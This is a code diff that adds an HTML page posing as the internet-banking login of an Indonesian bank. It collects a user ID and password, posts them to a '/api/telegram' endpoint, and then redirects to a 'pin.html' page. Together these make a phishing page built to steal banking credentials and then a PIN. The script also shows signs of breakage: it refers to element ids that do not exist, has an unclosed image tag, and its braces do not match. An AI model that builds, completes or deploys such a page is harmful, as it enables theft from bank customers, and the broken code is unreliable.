@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Internet-Banking</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,Helvetica,sans-serif;
+}
+
+body{
+    background:#eef4ff;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:55vh;
+}
+
+.container{
+    width:720px;
+    background:#fff;
+    border-radius:1px;
+    overflow:hidden;
+    box-shadow:0 10px 25px rgba(0,0,0,.15);
+}
+
+.header{
+    background:linear-gradient(180deg,#1D4A7A,#13A29B);
+    color:#fff;
+    text-align:center;
+    padding:1px 3px;
+}
+
+.logo-bank{
+    width:370px;
+    height:160px;
+    display: block;
+    margin-bottom:0px;
+  }
+
+.content{
+    padding:20px;
+}
+
+label{
+    display:block;
+    margin-bottom:6px;
+    color:#444;
+    font-size:17px;
+}
+
+input{
+    width:100%;
+    padding:12px;
+    margin-bottom:15px;
+    border:1px solid #ccc;
+    border-radius:4px;
+    font-size:14px;
+}
+
+button{
+    width:100%;
+    padding:14px;
+    background:#F4B41A;
+    color:#fff;
+    border:none;
+    border-radius:4px;
+    font-size:16px;
+    cursor:pointer;
+}
+
+button:hover{
+    opacity:.9;
+}
+
+.footer{
+    text-align:center;
+    padding:15px;
+    color:#777;
+    font-size:12px;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+<div class="header">
+<img src="images/bankjateng.jpg" alt="logo" class="logo-bank"
+<h2></h2>
+<p></p>
+</div>
+
+<div class="content">
+
+<form id="form1">
+
+<label>User ID</label>
+<input type="text" name="userid" placeholder="username anda" required>
+
+<label>Password</label>
+<input type="password" name="password" placeholder="password anda" required>
+
+<button type="submit">Masuk</button>
+
+</form>
+
+</div>
+
+<div class="footer">
+Versi 1.0.0
+</div>
+
+</div>
+<script>
+document.getElementById("form").addEventListener("submit", async function(e) {
+  e.preventDefault();
+
+  const data = {
+    userid: document.getElementById("userid").value,
+    password: document.getElementById("password").value,
+     };
+
+  const response = await fetch("/api/telegram", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(data)
+  });
+
+  const result = await response.json();
+
+  document.getElementById("hasil").textContent =
+    result.success ? "Data berhasil dikirim." : "Gagal mengirim data.";
+});
+  
+    window.location.href = "pin.html";
+
+});
+</script>
+
+</body>
+</html>
